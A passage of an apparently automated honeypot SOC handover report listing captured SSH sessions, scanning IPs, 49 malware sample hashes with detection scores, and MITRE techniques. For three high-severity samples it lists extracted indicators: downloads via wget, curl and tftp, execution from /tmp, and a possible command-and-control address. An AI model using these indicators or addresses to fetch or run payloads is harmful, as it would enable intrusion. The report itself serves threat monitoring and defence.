| **Last Seen** | 2026-07-15 22:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 22:42:13` | `cowrie.session.connect` |
| `2026-07-15 22:42:13` | `cowrie.client.version` |
| `2026-07-15 22:42:13` | `cowrie.client.kex` |
| `2026-07-15 22:42:14` | `cowrie.login.success` |
| `2026-07-15 22:42:14` | `cowrie.direct-tcpip.request` |
| `2026-07-15 22:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-15 21:15 | 2026-07-15 22:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]185` | **4** | 2026-07-15 22:45 | 2026-07-15 22:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]152` | **3** | 2026-07-15 21:11 | 2026-07-15 21:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-15 21:55 | 2026-07-15 21:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.50[.]133` | **2** | 2026-07-15 21:38 | 2026-07-15 21:40 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-15 21:14 | 2026-07-15 21:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-07-15 21:18 | 2026-07-15 21:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.228.47[.]238` | 1 | 2026-07-15 21:59 | 2026-07-15 21:59 | 12s | 0 | `T1592` | 🟢 LOW |
| `177.22.44[.]30` | 1 | 2026-07-15 21:08 | 2026-07-15 21:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]69` | 1 | 2026-07-15 21:23 | 2026-07-15 21:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]87` | 1 | 2026-07-15 21:45 | 2026-07-15 21:45 | 4s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-15 21:47 | 2026-07-15 21:48 | 42s | 0 | `T1592` | 🟢 LOW |
| `212.73.75[.]82` | 1 | 2026-07-15 22:31 | 2026-07-15 22:32 | 41s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-07-15 21:33 | 2026-07-15 21:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]209` | 1 | 2026-07-15 22:10 | 2026-07-15 22:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-15 22:53 | 2026-07-15 22:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `92.62.74[.]41` | KG | Chui 121 | **100** ⚠️ | 50 |
| `65.20.179[.]251` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `103.103.53[.]44` | IN | Catla IT and Engg.Co.Pvt.Ltd. | **100** ⚠️ | 50 |
| `183.171.148[.]87` | MY | Celcom Axiata Berhad | **100** ⚠️ | 11 |
| `136.56.34[.]147` | US | Google Fiber Inc. | **100** ⚠️ | 50 |
| `212.73.75[.]82` | AM | Telecom Armenia OJSC | **100** ⚠️ | 50 |
| `59.120.8[.]61` | TW | Data Communication Business Group, | **100** ⚠️ | 48 |
| `210.13.99[.]66` | CN | Lei Jiesi Business Services (Shanghai) Co., Ltd. | **100** ⚠️ | 50 |
| `103.61.122[.]229` | VN | H2 VIET NAM TECHNOLOGY SOLUTIONS COMPANY LIMITED | **100** ⚠️ | 50 |
| `45.227.254[.]152` | BZ | XWIN UNIVERSAL LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 48 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 43 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 98 cases |
| Tool 34  | Credential Extractor        | ✅ 61 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (26.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 42 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-15T23:01:11Z_
